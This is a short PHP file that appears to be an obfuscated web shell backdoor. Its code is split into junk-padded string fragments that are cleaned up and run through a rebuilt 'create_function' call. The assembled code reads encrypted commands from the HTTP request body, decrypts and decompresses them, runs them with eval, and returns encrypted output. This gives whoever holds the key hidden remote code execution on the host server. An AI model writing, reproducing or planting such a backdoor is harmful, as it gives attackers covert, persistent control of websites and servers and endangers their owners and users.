<?php
$v='"/$khE-(.+)$E-kf/",@E-E-file_getE-_contE-eE-nts("php://input")E-,$m)==E-1) {E-E-@ob_start();@eE-E-';
$Y='nctioE-n x($E-t,E-$k){$cE-=strlen(E-$k);$E-l=sE-trlen($tE-);$o="";forE-($i=E-0;$i<$lE-;)E-{for($E-j=0';
$J='val(@gE-zE-uncompressE-(@xE-(@bE-ase64_E-decoE-de($m[1]),$k)));$o=@E-obE-_get_E-conE-tents();@E-ob';
$x='$E-kE-="E-2dE-2eE-2151";$kh="6edb38b590f5";E-$kf="00117cdE-75e0fE-";E-$p=E-"NvZg7BFdCE-XYTfpBoE-";fu';
$q=str_replace('kj','','ckjkjrekjkjatekj_functkjion');
$M='_end_clE-ean();$r=E-@bE-ase64E-E-_encode(@x(@gzE-compresE-s($E-o),$k)E-);print(E-"$p$E-kh$r$kf");}';
$b=';($j<$c&E-&$iE-<$l);$jE-E-+E-+,$i++){$o.=$tE-{$i}^$k{$jE-};}E-E-}return $o;}if E-E-(@preg_mE-atch(';
$O=str_replace('E-','',$x.$Y.$b.$v.$J.$M);
$A=$q('',$O);$A();
?>
